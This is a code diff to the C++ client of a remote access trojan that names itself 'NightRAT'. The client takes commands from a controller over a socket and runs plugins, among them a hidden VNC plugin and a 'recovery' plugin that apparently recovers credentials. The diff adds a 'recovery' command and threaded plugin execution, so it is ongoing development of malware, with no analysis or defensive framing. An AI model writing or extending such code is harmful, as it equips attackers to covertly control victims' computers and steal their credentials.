@@ -89,6 +89,7 @@ struct PacketHeader {
 class NightClient {
 private:
     SOCKET sock;
+    HANDLE hSocketMutex;
     PluginManager pluginMgr;
     bool connected = false;
     string pendingPluginId;
@@ -117,7 +118,10 @@ private:
     void send_data(json data) {
         if (!connected) return;
         string msg = data.dump() + "\r\n";
+
+        if (hSocketMutex) WaitForSingleObject(hSocketMutex, INFINITE);
         send(sock, msg.c_str(), (int)msg.length(), 0);
+        if (hSocketMutex) ReleaseMutex(hSocketMutex);
     }
 
     void request_plugin(const string& pluginId, const json& commandToRunAfterLoad = json()) {
@@ -250,6 +254,15 @@ private:
 								MB_OK | iconFlag | MB_SYSTEMMODAL);
 					}).detach();
 			}
+            else if (action == "recovery") {
+                if (pluginMgr.isPluginLoaded(RECOVERY_PLUGIN_ID)) {
+                    thread([this, s = sock]() {
+                        pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", s);
+                    }).detach();
+                } else {
+                    request_plugin(RECOVERY_PLUGIN_ID);
+                }
+            }
             else if (action == "ping") {
                 send_data({{"action", "pong"}});
             }
@@ -334,7 +347,9 @@ private:
                                         pluginMgr.executePlugin(HIDDEN_VNC_PLUGIN_ID, "RunPlugin", sock);
                                     }
                                 } else if (pluginId == RECOVERY_PLUGIN_ID) {
-                                    pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
+                                    thread([this, s = sock]() {
+                                        pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", s);
+                                    }).detach();
                                 }
                             }
 
@@ -385,6 +400,14 @@ private:
     }
 
 public:
+    NightClient() {
+        hSocketMutex = CreateMutexW(NULL, FALSE, L"Global\\NightRAT_Socket_Mutex");
+    }
+
+    ~NightClient() {
+        if (hSocketMutex) CloseHandle(hSocketMutex);
+    }
+
     void start(const char* ip, int port) {
         while (true) {
             WSADATA wsa;
